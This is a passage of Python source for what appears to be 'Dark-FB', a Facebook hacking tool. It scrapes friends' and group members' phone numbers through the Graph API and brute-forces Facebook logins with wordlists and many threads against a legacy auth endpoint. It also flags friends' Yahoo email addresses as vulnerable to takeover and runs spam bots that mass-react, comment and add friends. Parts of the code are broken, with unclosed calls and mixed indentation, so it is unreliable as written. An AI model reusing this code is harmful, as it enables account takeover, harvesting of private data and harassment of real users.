            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def no_teman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        try:
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
            s = json.loads(r.text)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Fetching number phone all friend ...' + tutup
            save = open('dump/no_teman.txt', 'w')
            for i in s['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    nofriend.append(z['mobile_phone'])
                    save.write(z['mobile_phone'] + '\n')
                    print tutup + '\r\033[37;1m[ ' + lime + str(len(nofriend)) + tutup + ' \033[37;1m] ' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Successfully get number phone friend'
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[37;1m+' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/no_teman.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Successfully get number phone friend'
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/no_teman.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def no_dariteman():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError:
        pass
    else:
        idt = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Input ID Friend : '
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            p = json.loads(r.text)
            print tutup + '\033[37;1m[' + blue + '\xe2\x9c\x93' + tutup + '\033[37;1m] Get Number From : ' + lime + p['name']
        except KeyError:
            print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Not Found'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()

        try:
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
            a = json.loads(r.text)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Fetching number phone all friend from ' + lime + p['name'] + tutup
            save = open('dump/no_dariteman.txt', 'w')
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + token)
                z = json.loads(x.text)
                try:
                    nofromfriend.append(z['mobile_phone'])
                    save.write(z['mobile_phone'] + '\n')
                    print tutup + '\r\033[37;1m[ ' + lime + str(len(nofromfriend)) + tutup + ' \033[37;1m] ' + z['mobile_phone'] + ' | ' + z['name'] + '\n',
                    sys.stdout.flush()
                    time.sleep(0.0001)
                except KeyError:
                    pass

            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Successfully get number phone friend from ' + lime + p['name'] + tutup
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/no_dariteman.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyboardInterrupt:
            save.close()
            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Successfully get number phone friend from ' + lime + p['name'] + tutup
            done = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Save file with name : '
            print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Create file ...'
            time.sleep(2)
            os.rename('dump/no_dariteman.txt', 'dump/' + done)
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] File saved : ' + lime + 'dump/' + done + tutup
            print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Selesai'
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()


def no_member():
    try:
    	token = open('logs.txt').read()
        os.mkdir('dump')
    except OSError: pass
    idg = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] Input ID Group : "
    try:
            r = requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+token)
            s = json.loads(r.text)
	    print tutup+"\033[37;1m["+blue+"\033[33;1m*"+tutup+"\033[37;1m] Name Group : "+lime+s["name"]+tutup
    except KeyError:
	    print tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Group Not Found"
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    try:
	    print tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] Fetching number phone from member group ..."+tutup
	    save = open('dump/no_member.txt','w')
	    y = requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+token)
	    z = json.loads(y.text)
	    for a in z['data']:
		    x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+token)
		    z = json.loads(x.text)
		    try:
			    nomem.append(z['mobile_phone'])
			    save.write(z['mobile_phone']+'\n')
			    print (tutup+"\r[ "+lime+str(len(nomem))+tutup+" ] "+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
		    except KeyError: pass
	    save.close()
	    print tutup+"\n\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] Successfully get number phone from member group"
	    done = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] Save file with name : "
	    print tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] Create file ..."; time.sleep(2)
	    os.rename('dump/no_member.txt','dump/'+done)
	    print tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] File saved : "+lime+"dump/"+done+tutup
	    print tutup+"\033[37;1m["+lime+"\033[37;1m+"+tutup+"\033[37;1m] Selesai"
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    except KeyboardInterrupt:
	    save.close()
	    print tutup+"\n\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Successfully get number phone from member group"
	    done = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Save file with name : "
	    print tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Create file ..."; time.sleep(2)
	    os.rename('dump/no_member.txt','dump/'+done)
	    print tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] File saved : "+lime+"dump/"+done+tutup
	    print tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] Selesai"
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()


def hack():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup+"\033[37;1m["+lime+"\033[31;1m01"+tutup+"\033[37;1m] BruteForce"
    print tutup+"\033[37;1m["+lime+"\033[31;1m02"+tutup+"\033[37;1m] Multi BruteForce"
    print tutup+"\033[37;1m["+lime+"\033[31;1m03"+tutup+"\033[37;1m] Super Multi BruteForce"
    print tutup+"\033[37;1m["+lime+"\033[31;1m04"+tutup+"\033[37;1m] Yahoo Checker"
    print tutup+"\033[37;1m["+merah+"\033[31;1m00"+tutup+"\033[37;1m] Back"
    print
    mana_hack = raw_input(tutup+"\033[37;1m["+lime+"\033[31;1mSelection"+tutup+"\033[37;1m]> "
    if mana_hack =="":
	    exit(tutup+"\033[37;1m["+merah+"!"+tutup+"\033[37;1m] Exit"+tutup)
    elif mana_hack in ['1','01']:
	    force()
    elif mana_hack in ['2','02']:
        multi()
        hasil()
    elif mana_hack in ['3','03']:
	    super()
    elif mana_hack in ['4','04']:
	    yahoofriends()
    elif mana_hack in ['0','00']:
	    menu()
    else:
	    exit(tutup+"\033[37;1m["+merah+"!"+tutup+"\033[37;1m] Exit"+tutup)

def force():
    try:
	os.mkdir('crack')
	token = open('logs.txt').read()
    except OSError: pass
    try:
	    id = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] ID Target : "
	    list = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Wordlist : "
	    isi = open(list,'r').readlines()
    except IOError:
	    exit(tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Wordlist Not Found"+tutup)
    print (tutup+"\r\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Total list : "+lime+str(len(isi)))
    sandi = open(list,'r')
    for ps in sandi:
	    try:
		    ps = ps.replace("\n","")
		    print (tutup+"\r\033[37;1m["+merah+"\033[32;1m*"+tutup+"\033[37;1m] Try : "+ps+lime)
		    r = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(ps)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		    s = json.loads(r.text)
		    if 'access_token' in s:
			    dapat = open("crack/brute.txt","w")
			    dapat.close()
			    print tutup+"\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Found : "+lime+id+tutup+"|"+lime+ps+tutup
			    exit()
		    elif 'www.facebook.com' in s['error_msg']:
			    cek = open("crack/brute_cek.txt","w")
			    cek.close()
			    print tutup+"\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Found : "+lime+id+tutup+"|"+lime+ps+tutup
			    exit()
	    except requests.exceptions.ConnectionError:
		    print tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Koneksi error"
		    time.sleep(1)


def multi():
    global idlist,file,pasw
    print
    idlist = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] List ID : "
    pasw = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m+"+tutup+"\033[37;1m] Password : "
    try:
	    file = open(idlist,'r')
	    for z in range(40):
		    t = threading.Thread(target=nextc, args=())
		    t.start()
		    threads.append(t)
	    for t in threads:
		    t.join()
    except IOError:
	    exit(tutup+"["+merah+"!"+tutup+"] File not found"+tutup)


def nextc():
    try:
        os.mkdir('crack')
        token = open('logs.txt').read()
    except OSError:
        pass
    else:
        try:
            buka = open(idlist, 'r')
            isi = buka.read().split()
            while file:
                user = file.readline().strip()
                url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pasw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                data = urllib.urlopen(url)
                w = json.load(data)
                if back == len(isi):
                    break
                if 'access_token' in w:
                    ok = open('crack/multi_ok.txt', 'w')
                    ok.write(user + '|' + pasw + '\n')
                    ok.close()
                    x = requests.get('https://graph.facebook.com/' + user + '?access_token=' + w['access_token'])
                    z = json.loads(x.text)
                    berhasil.append(tutup + '\033[37;1m[' + lime + '\033[32;1mOK' + tutup + '\033[37;1m] ' + user + ' | ' + pasw + ' = ' + z['name'])
                elif 'www.facebook.com' in w['error_msg']:
                    cek = open('crack/multi_cek.txt', 'w')
                    cek.write(user + '|' + pasw + '\n')
                    cek.close()
                    checkpoint.append(tutup + '\033[37;1m[' + kuning + '\033[33;1mCP' + tutup + '\033[37;1m] ' + user + ' | ' + pasw + tutup)
                else:
                    gagal.append(user)
                    back += 1
                sys.stdout.write(tutup + '\r\033[37;1m[' + blue + '\033[36;1m*' + tutup + '\033[37;1m] ' + str(back) + lime + '/' + tutup + str(len(isi)) + tutup + ' = ' + lime + str(len(berhasil)) + tutup + ' ' + kuning + str(len(checkpoint)) + tutup + ' ' + merah + str(len(gagal)) + tutup)
                sys.stdout.flush()

        except IOError:
            print merah + '\n...' + tutup
        except requests.exceptions.ConnectionError:
            print tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Koneksi Error'
            hasil()
 

def hasil():
    print
    for b in berhasil:
        print b
        print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] File Saved : ' + lime + 'crack/multi_ok.txt' + tutup

    for c in checkpoint:
        print c
        print tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] File Saved : ' + lime + 'crack/multi_cek.txt' + tutup

    exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Exit')

def super():
    print
    try:
        os.mkdir('crack')
    except OSError:
        pass
    else:
        if os.path.exists('crack/auto_ok.txt'):
            if os.path.getsize('crack/auto_ok.txt') != 0:
                oh = raw_input(tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] ' + lime + 'crack/auto_ok.txt' + tutup + ' replace?(y/n): '
                if oh == 'y':
                    open('crack/auto_ok.txt', 'w').close()
            else:
                open('crack/auto_cek.txt', 'w').close()
        if os.path.exists('crack/auto_cek.txt'):
            if os.path.getsize('crack/auto_cek.txt') != 0:
                cp = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] ' + lime + 'crack/auto_cek.txt' + tutup + ' replace?(y/n): '
                if cp == 'y':
                    open('crack/auto_cek.txt', 'w').close()
            else:
                open('crack/auto_cek.txt', 'w').close()
        file = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m' + tutup + '\033[37;1m] List ID : '
        pw = raw_input(tutup + '\033[37;2m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Extra Password : '
        try:
            pr = open(file, 'r').read().splitlines()
            for x in pr:
                auto_total.append(x)
                print tutup + '\r\033[37;1m[' + lime + '\033[36;1m' + tutup + '\033[37;1m] Total : ' + lime + str(len(auto_total)),
                sys.stdout.flush()
                time.sleep(0.0001)

        except IOError:
            exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] File not found' + tutup)

    p = ThreadPool(input('\n' + tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Threads : '
    p.map(cekrek, auto_total)
    if auto_ok > 0 or auto_cp > 0:
        print tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Total : ' + lime + str(len(auto_ok)) + tutup + ' ' + kuning + str(len(auto_cp)) + tutup
    else:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Tidak ada result')
    if auto_ok > 0:
        print tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] File Saved : ' + lime + 'crack/auto_ok.txt' + tutup
    if auto_cp > 0:
        print tutup + '\033[37;1m[' + lime + '\033[33;1m*+' + tutup + '\033[37;1m] File Saved : ' + kuning + 'crack/auto_cp.txt' + tutup
    exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Exit')


def yahoofriends():
    try:
       token = open('logs.txt').read()
    except:
        print('\033[37;1m[\033[31;1m*\033[37;1m] Token Tidak Ada')
    print
    mpsh = []
    jml = 0
    print tutup+"\033[37;1m["+lime+"\033[31;1m*"+tutup+"\033[37;1m] Pastikan Koneksi Lancar ..."+tutup
    teman = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
    kimak = json.loads(teman.text)
    save = open('MailVuln.txt','w')
    for w in kimak['data']:
	    jml +=1
	    mpsh.append(jml)
	    id = w['id']
	    nama = w['name']
	    r = requests.get("https://graph.facebook.com/"+id+"?access_token="+token)
	    z = json.loads(r.text)
	    try:
		    mail = z['email']
		    yahoo = re.compile(r'@.*')
		    otw = yahoo.search(mail).group()
		    if 'yahoo.com' in otw:
			    sex.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
			    sex._factory.is_html = True
			    sex.select_form(nr=0)
			    sex["username"] = mail
			    klik = sex.submit().read()
			    jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
			    try:
				    pek = jok.search(klik).group()
			    except:
				    print tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Mail : "+mail+merah+" Not Vuln"
				    continue
			    if '"messages.ERROR_INVALID_USERNAME">' in pek:
				    save.write(mail + '\n')
				    print tutup+"\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Mail : "+mail+lime+" \033[32;1mVuln"
			    else:
				    print tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Mail : "+mail+merah+" Not vuln"
	    except KeyError:
		    pass
    raw_input(tutup+"\nEnter returns to the menu ...")
    menu()


def daftar():
    os.system('clear')
    try:
        os.mkdir('api')
        token = open('logs.txt').read()
    except OSError:
        pass

    print tutup + '               [ Dark-FB ]v1.8               '
    print 'Ingin membeli api-key bisa hubungi saya melalui : '
    print tutup + 'WA.me : ' + lime + '+62 82288231535' + tutup
    print
    on = raw_input('[>] Masukkan API KEY : ')
    r = requests.get('https://pastebin.com/raw/ANfbRTP3').text
    if on == '':
        daftar()
    elif len(on) < 10:
        daftar()
    elif on in r:
        sv = open('api/key.txt', 'w')
        sv.write(on)
        sv.close()
        login()
    else:
        daftar()


def bot():
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '\033[37;1m[' + lime + '\033[31;1m01' + tutup + '\033[37;1m] React target post'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m02' + tutup + '\033[37;1m] React group post'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m03' + tutup + '\033[37;1m] Coment target post'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m04' + tutup + '\033[37;1m] Coment grup post'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m05' + tutup + '\033[37;1m] Add friend from target ID'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m06' + tutup + '\033[37;1m] Accept all friend requests'
    print tutup + '\033[37;1m[' + lime + '\033[32;1m07' + tutup + '\033[37;1m] Delete all friends'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m08' + tutup + '\033[37;1m] Delete all post'
    print tutup + '\033[37;1m[' + lime + '\033[31;1m09' + tutup + '\033[37;1m] Auto follow'
    print tutup + '\033[37;1m[' + merah + '\033[31;1m00' + tutup + '\033[37;1m] Back'
    print
    mana_bot = raw_input(tutup + '\033[37;1m[' + lime + '\033[31;1mSelection' + tutup + '\033[37;1m]> '
    if mana_bot == '':
        exit(tutup + '\033[37;1m[' + merah + '*' + tutup + '\033[37;1m] Exit' + tutup)
    elif mana_bot in ('1', '01'):
        react_target()
    elif mana_bot in ('2', '02'):
        react_grup()
    elif mana_bot in ('3', '03'):
        target_komen()
    elif mana_bot in ('4', '04'):
        grup_komen()
    elif mana_bot in ('5', '05'):
        add()
    elif mana_bot in ('6', '06'):
        acc()
    elif mana_bot in ('7', '07'):
        delete()
    elif mana_bot in ('8', '08'):
        deletepost()
    elif mana_bot in ('9', '09'):
        follow()
    elif mana_bot in ('0', '00'):
       menu()
    else:
        exit(tutup + '\033[37;1m[' + merah + '*' + tutup + '\033[37;1m] Exit' + tutup)


def react_target():
    reaksi = []
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup+"\033[37;1m["+lime+"\033[36;1m01"+tutup+"\033[37;1m] Like\n"+tutup+"\033[37;1m["+lime+"\033[36;1m02"+tutup+"\033[37;1m] Love\n"+tutup+"\033[37;1m"+lime+"\033[36;1m03"+tutup+"\033[37;1m] Wow\n"+tutup+"\033[37;1m"+lime+"\033[36;1m04"+tutup+"\033[37;1m] Haha\n"+tutup+"\033[37;1m["+lime+"\033[36;1m05"+tutup+"\033[37;1m] Sad\n"+tutup+"\033[37;1m"+lime+"\033[36;1m06"+tutup+"\033[37;1m] Angry\n"+tutup+"\033[37;1m["+merah+"\033[31;1m00"+tutup+"\033[37;1m] Back"
    print
    emot = raw_input(tutup+"\033[37;1m["+lime+"\033[31;1mSelection"+tutup+"\033[37;1m]> "
    if emot in ['1','\033[36;1m01']:
	    tipe = "\033[37;1mLIKE"
    elif emot in ['2','\033[36;1m02']:
	    tipe = "\033[37;1mLOVE"
    elif emot in ['3','\033[36;1m03']:
	    tipe = "\033[37;1mWOW"
    elif emot in ['4','\033[36;1m04']:
	    tipe = "\033[37;1mHAHA"
    elif emot in ['5','\033[36;1m05']:
	    tipe = "\033[37;1mSAD"
    elif emot in ['6','\033[36;1m06']:
	    tipe = "\033[37;1mANGRY"
    elif emot in ['0','\033[31;1m00']:
	    menu()
    else:
	    exit(tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Exit"+tutup)
    print
    id = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Input ID Target : "
    limit = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Limit : "
    try:
	    r = requests.get("https://graph.facebook.com/"+id+"?fields=feed.limit("+limit+")&access_token="+token)
	    x = json.loads(r.text)
	    for z in x['feed']['data']:
		    idz = z['id']
		    reaksi.append(idz)
		    requests.post("https://graph.facebook.com/"+idz+"/reactions?type="+tipe+"&access_token="+token)
		    print(tutup+"\r["+blue+"*"+tutup+"] "+str(len(reaksi))+lime+"/"+tutup+limit),;sys.stdout.flush()
	    print tutup+"\n\033[37;1m["+lime+"\033[32;1m*"+tutup+"\033[37;1m] Done"+tutup
	    raw_input(tutup+"\nEnter returns to the menu ...")
	    menu()
    except KeyError:
	    exit(tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] ID Not Found"+tutup)


def react_grup():
    reaksi = []
    try:
    	token = open('logs.txt').read
    except:
    	menu()
    print tutup + '\033[37;1m[' + lime + '\033[36;1m01' + tutup + '\033[37;1m] Like\n' + tutup + '\033[37;1m[' + lime + '\033[36;1m02' + tutup + '\033[37;1m] Love\n' + tutup + '\033[37;1m' + lime + '\033[36;1m03' + tutup + '\033[37;1m] Wow\n' + tutup + '\033[37;1m' + lime + '\033[36;1m04' + tutup + '\033[37;1m] Haha\n' + tutup + '\033[37;1m' + lime + '\033[36;1m05' + tutup + '\033[37;1m Sad\n' + tutup + '\033[37;1m[' + lime + '\033[36;1m06' + tutup + '\033[37;1m] Angry\n' + tutup + '\033[37;1m' + merah + '\033[31;1m00' + tutup + '\033[37;1m Back'
    print
    emot = raw_input(tutup + '\033[37;1m[' + lime + '\033[31;1mSelection' + tutup + '\033[37;1m]> '
    if emot in ('1', '\033[36;1m01'):
        tipe = '\033[37;1mLIKE'
    elif emot in ('2', '\033[36;1m02'):
        tipe = '\033[37;1mLOVE'
    elif emot in ('3', '\033[37;1m03'):
        tipe = '\033[37;1mWOW'
    elif emot in ('4', '\033[36;1m04'):
        tipe = '\033[37;1mHAHA'
    elif emot in ('5', '\033[36;1m05'):
        tipe = '\033[37;1mSAD'
    elif emot in ('6', '\033[36;1m06'):
        tipe = '\033[37;1mANGRY'
    elif emot in ('0', '\033[31;1m00'):
        menu()
    else:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Exit' + tutup)
    print
    id = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Input ID Group : '
    limit = raw_input(tutup + '\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Limit : '
    try:
    	token = open('logs.txt').read()
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
        print tutup + '\033[37;1m[' + lime + '\033[33;1m+' + tutup + '\033[37;1m] Name Group : ' + lime + asw['name']
    except KeyError:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Group Not Found' + tutup)
    else:
        try:
            r = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
            x = json.loads(r.text)
            for z in x['feed']['data']:
                idz = z['id']
                reaksi.append(idz)
                requests.post('https://graph.facebook.com/' + idz + '/reactions?type=' + tipe + '&access_token=' + token)
                print tutup + '\r\033[37;1m[' + blue + '\033[33;1m*' + tutup + '\033[37;1m] ' + str(len(reaksi)) + lime + '/' + tutup + limit,
                sys.stdout.flush()

            print tutup + '\n\033[37;1m[' + lime + '\033[33;1m*' + tutup + '\033[37;1m] Done' + tutup
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyError:
            exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Exit' + tutup)


def target_komen():
    komen = []
    try:
    	token = open('logs.txt').read
    except:
    	menu()
    print tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + "\033[37;1m] Type '<>' untuk baris baru" + tutup
    id = raw_input(tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Input ID Target : '
    kom = raw_input(tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Komentar : '
    limit = raw_input(tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Limit : '
    km = kom.replace('<>', '\n')
    try:
    	token = open('logs.txt').read()
        r = requests.get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        f = json.loads(r.text)
        for z in f['feed']['data']:
            ie = z['id']
            komen.append(ie)
            requests.post('https://graph.facebook.com/' + ie + '/comments?message=' + km + '&access_token=' + token)
            print tutup + '\r\033[37;1m[' + blue + '\033[36;1m*' + tutup + '\033[37;1m] ' + str(len(komen)) + lime + '/' + tutup + limit,
            sys.stdout.flush()

        print tutup + '\n\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Done' + tutup
        raw_input(tutup + '\nEnter returns to the menu ...')
        menu()
    except KeyError:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Target Not Found' + tutup)


def grup_komen():
    komengrup = []
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    print tutup + '\033[37;1m[' + lime + '\033[36;1m+' + tutup + "\033[37;1m] Type '<>' untuk baris baru" + tutup
    id = raw_input(tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Input ID Group : '
    kom = raw_input(tutup + '\033[37;1m[' + lime + '\033[32;1m*' + tutup + '\033[37;1m] Komentar : '
    limit = raw_input(tutup + '\033[37;1m[' + lime + '\033[31;1m*' + tutup + '\033[37;1m] Limit : '
    km = kom.replace('<>', '\n')
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
        print tutup + '\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Name Group : ' + lime + asw['name']
    except KeyError:
        exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Group Not Found' + tutup)
    else:
        try:
            p = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
            a = json.loads(p.text)
            for e in a['feed']['data']:
                grep = e['id']
                komengrup.append(grep)
                requests.post('https://graph.facebook.com/' + grep + '/comments?message=' + km + '&access_token=' + token)
                print tutup + '\r\033[37;1m[' + blue + '\033[33;1m*' + tutup + '\033[37;1m] ' + str(len(komengrup)) + lime + '/' + tutup + limit,
                sys.stdout.flush()

            print tutup + '\n\033[37;1m[' + lime + '\033[32;1m+' + tutup + '\033[37;1m] Done' + tutup
            raw_input(tutup + '\nEnter returns to the menu ...')
            menu()
        except KeyError:
            exit(tutup + '\033[37;1m[' + merah + '\033[31;1m*' + tutup + '\033[37;1m] Group Not Found' + tutup)


def add():
    ado = []
    try:
    	token = open('logs.txt').read()
    except:
    	menu()
    id = raw_input(tutup+"\033[37;1m["+lime+"\033[33;1m*"+tutup+"\033[37;1m] Target ID : "
    try:
	    r = requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(100)&access_token='+token)
	    t = json.loads(r.text)
    except KeyError: exit(tutup+"\033[37;1m["+merah+"\033[31;1m*"+tutup+"\033[37;1m] Target Not Found"+tutup)
    for y in t['friends']['data']:
	    ado.append(y['id'])
	    req = requests.post('https://graph.facebook.com/me/friends/'+y['id']+'?access_token='+token).text
	    if 'true' in req:
